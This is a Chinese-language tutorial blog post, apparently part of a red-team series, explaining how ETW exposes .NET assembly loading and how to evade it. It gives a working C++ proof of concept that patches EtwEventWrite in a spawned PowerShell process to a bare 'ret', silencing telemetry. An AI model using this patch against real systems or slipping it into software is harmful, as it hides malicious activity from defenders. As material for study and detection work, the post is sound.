# 【Day 25】又繞！又繞！又繞 ETW！ - Bypass ETW

## 環境
* Windows 10 21H1
* Visual Studio 2019

## 前情提要
在[【Day 23】為美好的 Windows 獻上 ETW - Event Tracing for Windows](https://ithelp.ithome.com.tw/articles/10279093) 說過 ETW 對於籃隊是一個非常有用的機制，可以蒐集使用者在系統上做的種種事情。然而雖然 ETW 很強大，但是仍然可能會被繞過，這篇就要來介紹一個繞過方法。

## .NET Assemblies
在繞過 ETW 之前，首先要了解 .NET Assemblies 這個先備知識。

### Execute Assembly
在紅隊測試工具 [Cobalt Strike](https://www.cobaltstrike.com/) 有個功能，叫做 [bexecute_assembly](https://www.cobaltstrike.com/aggressor-script/functions.html#bexecute_assembly)，它會在 Process 中執行 .NET Assemblies。原理是透過 ICLRMetaHost、ICLRRuntimeInfo 和 ICLRRuntimeHost 達到將 CLR 載入的效果。其中 CLR 是 .NET Framework 的虛擬機器元件 (Virtual Machine Component)，用來管理執行中的 .NET 程序。

### 觀察
.NET Assemblies 是有辦法被偵測的，以下用 Process Explorer 做示範。
1. 開啟 Powershell
2. 開啟 Sysinternals 裡的 procexp64.exe
3. 在 powershell.exe 那一欄按右鍵選 Properties
4. 點選 .NET Assemblies

從觀察可以看到，在 Process Explorer 中顯示的 .NET Assemblies 就放著這個 Process 所使用的 .NET Assemblies 資源。
![](https://i.imgur.com/goObFem.png)

### 原理
偵測的原理其實就是利用 ETW 的 Provider「.NET Common Language Runtime」，GUID 為 `{E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}`，使用方法可以參考之前的 Logman 或是用 KrabsETW 寫 Consumer。
```
Provider                                 GUID
-------------------------------------------------------------------------------
.NET Common Language Runtime             {E13C0D23-CCBC-4E12-931B-D9CC2EEE27E4}

Value               Keyword              Description
-------------------------------------------------------------------------------
0x0000000000000001  GCKeyword            GC
0x0000000000000002  GCHandleKeyword      GCHandle
0x0000000000000004  FusionKeyword        Binder
0x0000000000000008  LoaderKeyword        Loader
0x0000000000000010  JitKeyword           Jit
0x0000000000000020  NGenKeyword          NGen
0x0000000000000040  StartEnumerationKeyword StartEnumeration
0x0000000000000080  EndEnumerationKeyword StopEnumeration
0x0000000000000400  SecurityKeyword      Security
0x0000000000000800  AppDomainResourceManagementKeyword AppDomainResourceManagement
0x0000000000001000  JitTracingKeyword    JitTracing
0x0000000000002000  InteropKeyword       Interop
0x0000000000004000  ContentionKeyword    Contention
0x0000000000008000  ExceptionKeyword     Exception
0x0000000000010000  ThreadingKeyword     Threading
0x0000000000020000  JittedMethodILToNativeMapKeyword JittedMethodILToNativeMap
0x0000000000040000  OverrideAndSuppressNGenEventsKeyword OverrideAndSuppressNGenEvents
0x0000000000080000  TypeKeyword          Type
0x0000000000100000  GCHeapDumpKeyword    GCHeapDump
0x0000000000200000  GCSampledObjectAllocationHighKeyword GCSampledObjectAllocationHigh
0x0000000000400000  GCHeapSurvivalAndMovementKeyword GCHeapSurvivalAndMovement
0x0000000000800000  GCHeapCollectKeyword GCHeapCollect
0x0000000001000000  GCHeapAndTypeNamesKeyword GCHeapAndTypeNames
0x0000000002000000  GCSampledObjectAllocationLowKeyword GCSampledObjectAllocationLow
0x0000000020000000  PerfTrackKeyword     PerfTrack
0x0000000040000000  StackKeyword         Stack
0x0000000080000000  ThreadTransferKeyword ThreadTransfer
0x0000000100000000  DebuggerKeyword      Debugger
0x0000000200000000  MonitoringKeyword    Monitoring

Value               Level                Description
-------------------------------------------------------------------------------
0x00                win:LogAlways        Log Always
0x02                win:Error            Error
0x04                win:Informational    Information
0x05                win:Verbose          Verbose
```

而觸發事件記錄的地方是 Usermode，並且是從 Powershell 本身這個 Process 呼叫 EtwEventWrite 記錄事件。

## 繞過偵測
### 原理
既然已經知道記錄事件的是 Process 本身，那就可以在 Process 建立時就把 EtwEventWrite 竄改，讓它沒辦法正常運作。

### 實作流程
1. 建立一個 Powershell Process，並取得 Process Handle
2. 從 ntdll.dll 中取得 EtwEventWrite 的位址
3. 把 EtwEventWrite 的位址的權限改成可讀、可寫、可執行(rwx)
4. 將 EtwEventWrite 的 Function 的第一個 byte 改成 0xc3，也就是組語的 `ret`
5. 把 EtwEventWrite 的權限改回，並且繼續執行 Process

### POC
程式是從 [idiotc4t 的部落格](https://idiotc4t.com/defense-evasion/memory-pacth-bypass-etw)取得，做了一些小修改和註解，完整的程式專案可以參考我的 GitHub [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/%E5%8F%88%E7%B9%9E%EF%BC%81%E5%8F%88%E7%B9%9E%EF%BC%81%E5%8F%88%E7%B9%9E%20ETW%EF%BC%81/PatchEtweventwrite)。
```cpp=
#include <Windows.h>
#include <Tlhelp32.h>
int main() {
	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };
	si.cb = sizeof(si);

	// 1. 建立一個 Powershell Process，並取得 Process Handle
	CreateProcessA(NULL, (LPSTR)"powershell -noexit", NULL, NULL, NULL, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

	// 2. 從 ntdll.dll 中取得 EtwEventWrite 的位址
	HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
	LPVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");

	// 3. 把 EtwEventWrite 的位址的權限改成可讀、可寫、可執行(rwx)
	DWORD oldProtect;
	VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);

	// 4. 將 EtwEventWrite 的 Function 的第一個 byte 改成 0xc3，也就是組語的 ret
	char patch = 0xc3;
	WriteProcessMemory(pi.hProcess, (LPVOID)pEtwEventWrite, &patch, sizeof(char), NULL);

	// 5. 把 EtwEventWrite 的權限改回，並且繼續執行 Process
	VirtualProtectEx(pi.hProcess, (LPVOID)pEtwEventWrite, 1, oldProtect, NULL);
	ResumeThread(pi.hThread);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	return 0;
}
```

### 實際測試
在執行 POC 後，會建立一個 Powershell Process，如同前面說的，目前的 EtwEventWrite 已經被改掉了，因此不會記錄 .NET Assemblies 的事件。

再用 Process Explorer 打開看一次 Powershell 的狀態，可以注意到 .NET Assemblies 這個欄位變空白了。
![](https://i.imgur.com/nxjwqKV.png)

## 參考資料
* [XPN: Hiding your .NET - ETW](https://blog.xpnsec.com/hiding-your-dotnet-etw/)
* [POC: execute assembly](https://gist.github.com/xpn/e95a62c6afcf06ede52568fcd8187cc2)
* [寫 extern 的 dll](https://stackoverflow.com/questions/24970503/why-rundll-gives-missing-entry)
* [基于内存补丁ETW的绕过](https://idiotc4t.com/defense-evasion/memory-pacth-bypass-etw)
* [TamperETW](https://github.com/outflanknl/TamperETW)
* [BYOL——一种新颖的红队技巧](https://zhuanlan.zhihu.com/p/38601278)
* [Cobalt Strike: In-memory .NET Assembly Execution](https://blog.cobaltstrike.com/2018/04/09/cobalt-strike-3-11-the-snake-that-eats-its-tail/)
